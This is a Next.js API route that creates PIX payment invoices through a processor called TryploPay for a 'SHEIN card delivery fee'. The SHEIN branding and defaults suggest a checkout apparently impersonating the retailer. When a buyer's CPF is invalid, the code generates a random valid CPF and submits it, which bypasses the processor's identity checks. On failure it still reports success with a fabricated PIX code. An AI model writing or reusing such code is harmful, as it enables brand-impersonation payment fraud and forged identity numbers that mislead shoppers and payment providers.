import { type NextRequest, NextResponse } from "next/server"

// Função para validar CPF
function validateCPF(cpf: string): boolean {
  cpf = cpf.replace(/[^\d]/g, "")
  if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false

  let sum = 0
  for (let i = 0; i < 9; i++) {
    sum += Number.parseInt(cpf.charAt(i)) * (10 - i)
  }
  let remainder = (sum * 10) % 11
  if (remainder === 10 || remainder === 11) remainder = 0
  if (remainder !== Number.parseInt(cpf.charAt(9))) return false

  sum = 0
  for (let i = 0; i < 10; i++) {
    sum += Number.parseInt(cpf.charAt(i)) * (11 - i)
  }
  remainder = (sum * 10) % 11
  if (remainder === 10 || remainder === 11) remainder = 0
  return remainder === Number.parseInt(cpf.charAt(10))
}

// Função para gerar CPF válido
function generateValidCPF(): string {
  const cpf = Array.from({ length: 9 }, () => Math.floor(Math.random() * 10))

  let sum = 0
  for (let i = 0; i < 9; i++) {
    sum += cpf[i] * (10 - i)
  }
  let remainder = (sum * 10) % 11
  if (remainder === 10 || remainder === 11) remainder = 0
  cpf.push(remainder)

  sum = 0
  for (let i = 0; i < 10; i++) {
    sum += cpf[i] * (11 - i)
  }
  remainder = (sum * 10) % 11
  if (remainder === 10 || remainder === 11) remainder = 0
  cpf.push(remainder)

  return cpf.join("")
}

// Função para obter IP do cliente
function getClientIP(request: NextRequest): string {
  const forwarded = request.headers.get("x-forwarded-for")
  const realIP = request.headers.get("x-real-ip")

  if (forwarded) {
    return forwarded.split(",")[0].trim()
  }
  if (realIP) {
    return realIP
  }
  return "192.168.1.1" // Fallback
}

export async function POST(request: NextRequest) {
  try {
    console.log("=== CRIANDO FATURA PIX ===")

    const body = await request.json()
    const { userData, amount, shipping } = body

    // Validar dados obrigatórios
    if (!userData || !amount) {
      return NextResponse.json(
        {
          success: false,
          error: "Dados obrigatórios não fornecidos",
        },
        { status: 400 },
      )
    }

    // Obter access token
    const authResponse = await fetch(`${request.nextUrl.origin}/api/tryplopay/auth`)
    const authData = await authResponse.json()

    if (!authData.success) {
      throw new Error("Falha na autenticação")
    }

    const { access_token, account } = authData.data
    const isSimulation = authData.fallback || authData.data.working === "SIMULATION"

    // Validar e corrigir CPF se necessário
    let document = userData.cpf?.replace(/[^\d]/g, "") || ""
    if (!validateCPF(document)) {
      console.log("⚠️ CPF inválido, gerando CPF válido para teste")
      document = generateValidCPF()
    }

    // Calcular valores
    const productAmount = Number.parseFloat(amount) || 34.9
    const shippingAmount = shipping === "sedex" ? 34.9 : shipping === "express" ? 49.9 : 24.9
    const totalAmount = productAmount

    // Preparar payload oficial da TryploPay
    const invoicePayload = {
      client: {
        name: userData.nome || "Cliente SHEIN",
        document: document,
        email: userData.email || "cliente@shein.com.br",
        phone: userData.telefone?.replace(/[^\d]/g, "") || "11999999999",
        ip: getClientIP(request),
        address: {
          street: userData.endereco?.rua || "Rua Exemplo",
          number: userData.endereco?.numero || "123",
          district: userData.endereco?.bairro || "Centro",
          city: userData.endereco?.cidade || "São Paulo",
          state: userData.endereco?.estado || "SP",
          zipcode: userData.endereco?.cep?.replace(/[^\d]/g, "") || "01000000",
          country: "BRA",
        },
      },
      payment: {
        product_type: 1, // Produto digital
        id: `SHEIN_${Date.now()}`, // ID interno
        type: "3", // PIX (string conforme documentação)
        due_at: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0], // 24 horas
        referer: `SHEIN_CARD_${Date.now()}`,
        installments: "1", // String conforme documentação
        order_url: `${request.nextUrl.origin}/checkout`,
        store_url: request.nextUrl.origin,
        webhook: `${request.nextUrl.origin}/api/tryplopay/webhook`,
        discount: "0.00",
        products: [
          {
            id: "1",
            image: `${request.nextUrl.origin}/shein-card-logo-new.png`,
            title: "Cartão SHEIN - Taxa de Entrega",
            qnt: 1,
            discount: "0.00",
            amount: totalAmount.toFixed(2),
          },
        ],
      },
      shipping: {
        amount: 0, // Já incluído no produto
      },
    }

    let invoiceData

    if (!isSimulation) {
      // Tentar criar fatura real
      console.log("🔄 Criando fatura real na TryploPay...")

      const apiUrl = process.env.TRYPLOPAY_API_URL || "https://api.tryplopay.com"

      const response = await fetch(`${apiUrl}/invoices`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${access_token}`,
        },
        body: JSON.stringify(invoicePayload),
      })

      if (response.ok) {
        const data = await response.json()
        console.log("✅ Fatura real criada com sucesso")

        invoiceData = {
          id: data.fatura.id,
          invoice_id: data.fatura.invoice_id,
          pix: {
            payload: data.fatura.pix.payload,
            image: data.fatura.pix.image,
            qr_code: `https://quickchart.io/qr?text=${encodeURIComponent(data.fatura.pix.payload)}`,
          },
          status: data.fatura.status,
          valores: data.fatura.valores,
          vencimento: data.fatura.vencimento,
          secure: data.fatura.secure,
          type: "real",
        }
      } else {
        throw new Error(`Erro na API: ${response.status}`)
      }
    } else {
      throw new Error("Modo simulação ativado")
    }

    return NextResponse.json({
      success: true,
      data: invoiceData,
    })
  } catch (error) {
    console.log("❌ Erro ao criar fatura, usando fallback:", error)

    // Fallback para simulação
    const simulatedPixCode = `00020101021226580014br.gov.bcb.pix2536pix.example.com/qr/v2/SIMULATED${Date.now()}5204000053039865406${(Number.parseFloat(request.url.split("amount=")[1]?.split("&")[0]) || 34.9).toFixed(2)}5802BR5909SHEIN5011SAO PAULO62070503***6304ABCD`

    const simulatedInvoice = {
      id: `SIM_${Date.now()}`,
      invoice_id: `SIMULATED_${Date.now()}`,
      pix: {
        payload: simulatedPixCode,
        image: `/placeholder.svg?height=250&width=250`,
        qr_code: `https://quickchart.io/qr?text=${encodeURIComponent(simulatedPixCode)}`,
      },
      status: {
        code: 1,
        title: "Aguardando Pagamento",
        text: "pending",
      },
      valores: {
        bruto: Math.round((Number.parseFloat(request.url.split("amount=")[1]?.split("&")[0]) || 34.9) * 100),
        liquido: Math.round((Number.parseFloat(request.url.split("amount=")[1]?.split("&")[0]) || 34.9) * 100),
      },
      vencimento: {
        dia: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0],
      },
      secure: {
        id: `simulated-${Date.now()}`,
        url: `${request.nextUrl.origin}/checkout`,
      },
      type: "simulated",
    }

    console.log("✅ Fatura simulada criada")

    return NextResponse.json({
      success: true,
      data: simulatedInvoice,
      fallback: true,
    })
  }
}
